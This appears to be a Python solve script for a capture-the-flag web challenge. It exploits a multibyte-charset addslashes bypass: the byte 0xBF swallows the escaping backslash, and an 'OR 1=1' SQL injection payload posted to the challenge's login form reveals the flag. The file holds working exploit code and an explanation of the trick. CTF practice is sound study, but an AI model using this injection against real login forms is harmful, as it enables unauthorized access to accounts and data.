"""Escaped — "we escaped all special characters" (Pink CTF, Web): multibyte addslashes bypass.

The login escapes quotes the mysql/addslashes way: ' -> \'  (prefix 0x5C). But the DB connection
uses a multibyte charset (GBK-style), where 0xBF 0x5C is ONE character. So sending the raw byte
0xBF right before our quote makes the escaper's backslash get swallowed into a multibyte char,
leaving our 0x27 quote live. That breaks us out of the username string literal.

Usage: python -I solve.py            (defaults to https://sqli.pink.bayern/)
       python -I solve.py https://host/      (override target)
       python -I solve.py --demo     (offline self-check of the byte trick)
"""
import re
import sys
import time
import urllib.error
import urllib.request

DEFAULT = "https://sqli.pink.bayern/"
UA = "Mozilla/5.0 (solve.py)"  # a plain UA; the default python-urllib one is sometimes rate-limited


def post_raw(url: str, body: bytes) -> str:
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
    req = urllib.request.Request(url, data=body, headers=headers)  # url must be str; body stays raw bytes
    for attempt in range(4):  # the server occasionally 429/5xx under bursty probing; back off and retry
        try:
            return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")
        except (urllib.error.URLError, urllib.error.HTTPError):
            if attempt == 3:
                raise
            time.sleep(2 * (attempt + 1))


def demo():
    # The core identity: addslashes turns 0x27 into 0x5C 0x27; a lead byte 0xBF absorbs the 0x5C
    # under a GBK-style charset, so the 0x27 quote survives into the SQL string.
    raw = b"\xbf'"                       # what we send, as bytes
    escaped = raw.replace(b"'", b"\\'")  # what naive escaping produces: 0xBF 0x5C 0x27
    assert escaped == b"\xbf\x5c\x27"
    assert escaped.decode("gbk")[-1] == "'"  # GBK folds 0xBF5C to one char, leaving a live quote
    print("demo ok: 0xBF eats the escaping 0x5C, the 0x27 quote survives")


def main(url: str):
    # username = 0xBF 0x27(') OR 1=1 -- -   ; the 0xBF eats the escaper's 0x5C, freeing the quote.
    html = post_raw(url, b"username=%BF%27%20OR%201=1--%20-&password=x")
    m = re.search(r"PINK\{[^}]*\}", html)
    print("flag:", m.group(0) if m else "(none) " + html[:300])
    assert m, "injection failed"

    # Proof it is a real bypass and not a guessed password: a false condition is still denied.
    false_html = post_raw(url, b"username=%BF%27%20OR%201=2--%20-&password=x")
    assert "PINK{" not in false_html and "denied" in false_html.lower(), "no boolean difference"
    print("verified: OR 1=1 grants access, OR 1=2 is denied -> genuine injection")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--demo":
        demo(); sys.exit()
    main(sys.argv[1] if len(sys.argv) > 1 else DEFAULT)
